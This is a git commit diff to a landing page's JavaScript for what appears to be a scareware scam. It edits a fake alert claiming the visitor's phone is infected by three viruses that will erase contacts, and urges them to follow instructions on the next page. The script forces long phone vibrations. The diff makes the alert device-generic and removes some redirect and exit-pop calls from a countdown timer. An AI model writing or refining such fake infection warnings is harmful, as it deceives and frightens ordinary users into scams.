3b179db964d98be160d9cd713e13236d0a7b9555
Dmitriy Vepretskiy <d.vepretskiy@gmail.com>
2017-11-23 01:12:30 +0200

    Clean JS. Remove device name from HTML

--- lp_6/assets/js/script.js
+++ lp_6/assets/js/script.js
@@ -1,4 +1,4 @@
-alert("Warning: Your Samsung GT-N7100 has been infected by (3) viruses! Viruses will damage your mobile phone, SIM card and erase all your contacts! Please follow the instructions on the next page to remove the viruses.")
+alert("Warning: Your mobile device has been infected by (3) viruses! Viruses will damage your mobile phone, SIM card and erase all your contacts! Please follow the instructions on the next page to remove the viruses.")
 
 ! function() {
   navigator.vibrate = navigator.vibrate || navigator.webkitVibrate || navigator.mozVibrate || navigator.msVibrate, navigator.vibrate([1e3, 500, 1e3, 500, 1e3, 500, 1e3, 500, 1e3, 500, 1e3, 500, 1e3, 500, 1e3, 500, 1e3])
@@ -12,9 +12,6 @@ function timer() {
   count = count - 1;
   if (count <= 0) {
     clearInterval(counter);
-    loc();
-    exit_a1();
-    PreventExitPop = false;
     return;
   }
   document.getElementById("timer").innerHTML = count;
